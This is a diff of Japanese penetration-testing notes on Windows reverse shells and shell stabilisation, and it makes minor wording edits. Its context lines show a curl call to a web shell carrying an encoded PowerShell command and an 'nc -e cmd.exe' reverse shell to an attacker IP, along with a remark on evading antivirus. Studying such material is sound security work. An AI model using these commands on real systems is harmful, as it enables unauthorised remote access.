@@ -206,11 +206,10 @@ exit
 # WebShellの例
 curl http://example.com/shell.php?cmd=powershell -enc '<$EncodedTextの中身>'
 ```
-（ペイロード部分はURL encode not plusすること）
 
 #### 非推奨：`nc -e`
 
-Windowsでは使用可能な場合もあるが、AVによりブロックされる可能性が高く、ステルス性に欠ける
+Windowsでは使用可能な場合もあるが、AVによりブロックされる可能性が高く、ステルス性に欠ける。
 ```cmd
 nc -e cmd.exe <attacker_IP> <Port>
 ```
@@ -227,7 +226,7 @@ nc -e cmd.exe <attacker_IP> <Port>
 
 # シェルの安定化
 
-## 背景とシェル安定化の目的
+## シェル安定化の背景と目的
 
 - 攻撃によって得られたシェルは、機能が制限された不完全な（非インタラクティブ）シェルであることが多い
 	- 補完が効かない、カーソル移動できない、エディタ（`vim`や`nano`）が崩れるなど、操作に不自由がある
